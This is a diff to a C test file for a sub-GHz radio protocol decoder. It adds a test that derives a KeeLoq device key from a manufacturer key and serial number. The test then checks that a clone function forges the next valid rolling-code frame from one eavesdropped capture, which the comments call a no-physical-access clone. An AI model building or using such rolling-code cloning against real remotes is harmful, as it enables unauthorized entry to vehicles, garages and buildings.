@@ -1,4 +1,5 @@
 #include "../protocol/flipper_decoders.h"
+#include "../protocol/flipper_keeloq.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -11,6 +12,61 @@ static void expect(int ok, const char* label) {
         printf("  FAIL: %s\n", label);
         failures++;
     }
+}
+
+/* ── KeeLoq eavesdrop-only clone path ─────────────────────────────────────── */
+/* Prove that kl_derive_device_key + flipper_kl_clone_next recover the counter
+   and synthesize a valid NEXT frame from only a capture and the manufacturer
+   key — the two-message, no-physical-access clone. */
+static void test_keeloq_clone(void) {
+    uint64_t mfr = 0x1122334455667788ULL;
+    uint32_t sn = 0x0ABCDEF;
+    uint8_t btn = 0x2;
+
+    /* Build the device key the way AN1064 secure-learning would, then encrypt
+       a known counter to form a captured frame. */
+    uint64_t seed = (uint64_t)(sn) | ((uint64_t)(sn) << 28);
+    uint64_t dev = kl_encrypt((uint32_t)(seed & 0xFFFFFFFFu), mfr) |
+                   ((uint64_t)kl_encrypt((uint32_t)(seed >> 32), mfr) << 32);
+
+    uint32_t cnt = 0x1234;
+    /* Real HCS3xx plaintext: [31:28]=button, [27:26]=reserved, [25:16]=10-bit
+       discriminator (== SN[9:0]), [15:0]=counter. The decoder's kl_try_one()
+       gate requires the discriminator to equal sn & 0x3FF. */
+    uint32_t plain = ((uint32_t)(btn & 0xF) << 28) |
+                     ((sn & 0x3FFu) << 16) | cnt;
+    uint32_t enc = kl_encrypt(plain, dev);
+
+    KLFrame captured;
+    memset(&captured, 0, sizeof(captured));
+    captured.enc = enc;
+    captured.sn = sn;
+    captured.btn = btn;
+
+    /* Derivation round-trips. */
+    uint64_t recovered_dev = 0;
+    expect(kl_derive_device_key(mfr, sn, &recovered_dev),
+           "device key derives from manufacturer key + serial");
+    expect(recovered_dev == dev, "derived device key matches ground truth");
+
+    /* Clone-next synthesizes the counter+1 frame and recovers the fields. */
+    FlipperPulseBuf out;
+    FlipperDecodeResult dr;
+    expect(flipper_kl_clone_next(&captured, mfr, 400, 433.92f, &out, &dr),
+           "clone-next synthesizes a frame");
+    expect(out.len > 0 && out.len < FLIPPER_PULSE_MAX,
+           "clone frame has a bounded pulse count");
+    expect(dr.cnt == ((cnt + 1) & 0xFFFF), "clone frame advances the counter");
+    expect(dr.btn == btn, "clone frame preserves the button");
+    expect(dr.hop == kl_encrypt(((uint32_t)(btn & 0xF) << 28) |
+                                ((sn & 0x3FFu) << 16) |
+                                ((cnt + 1) & 0xFFFF), dev),
+           "clone hop decrypts to next counter under the device key");
+
+    /* Wrong button fails. */
+    captured.btn = 0x4;
+    expect(!flipper_kl_clone_next(&captured, mfr, 400, 433.92f, &out, &dr),
+           "clone rejects a button mismatch");
 }
 
 static void make_honda_vector(FlipperPulseBuf* buf, bool bad_checksum) {
@@ -287,6 +343,7 @@ int main(void) {
     test_honda_force_only();
     test_secplus1_ternary();
     test_secplus2_manchester();
+    test_keeloq_clone();
     printf("%d checks, %d failures\n", checks, failures);
     return failures ? 1 : 0;
 }
